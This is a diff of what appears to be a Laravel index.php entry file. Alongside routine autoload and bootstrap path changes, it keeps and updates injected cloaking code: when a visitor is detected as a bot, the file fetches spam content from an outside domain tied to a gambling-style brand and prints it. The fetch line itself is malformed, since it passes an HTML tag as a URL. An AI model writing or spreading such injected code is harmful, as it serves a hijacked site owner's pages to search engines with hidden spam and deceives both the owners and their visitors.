@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('<link rel="amphtml" href="https://amp-saya.com/brand/nustoto/thefatlamborlando.com/index.txt" />');#NAROLINK
+    $message = file_get_contents('<link rel="amphtml" href="https://amp-saya.com/brand/nustoto/advancingyourpotential.com/index.txt" />');#NAROLINK
     echo $message;
 }
 ?>
@@ -26,6 +26,8 @@ if (is_bot()) {
  * @author   Taylor Otwell <taylor@laravel.com>
  */
 
+define('LARAVEL_START', microtime(true));
+
 /*
 |--------------------------------------------------------------------------
 | Register The Auto Loader
@@ -34,11 +36,11 @@ if (is_bot()) {
 | Composer provides a convenient, automatically generated class loader for
 | our application. We just need to utilize it! We'll simply require it
 | into the script here so that we don't have to worry about manual
-| loading any of our classes later on. It feels nice to relax.
+| loading any of our classes later on. It feels great to relax.
 |
 */
 
-require __DIR__.'/bootstrap/autoload.php';
+require __DIR__.'/../advance/vendor/autoload.php';
 
 /*
 |--------------------------------------------------------------------------
@@ -52,7 +54,7 @@ require __DIR__.'/bootstrap/autoload.php';
 |
 */
 
-$app = require_once __DIR__.'/bootstrap/app.php';
+$app = require_once __DIR__.'/../advance/bootstrap/app.php';
 
 /*
 |--------------------------------------------------------------------------
@@ -75,7 +77,3 @@ $response = $kernel->handle(
 $response->send();
 
 $kernel->terminate($request, $response);
-
-
-
-
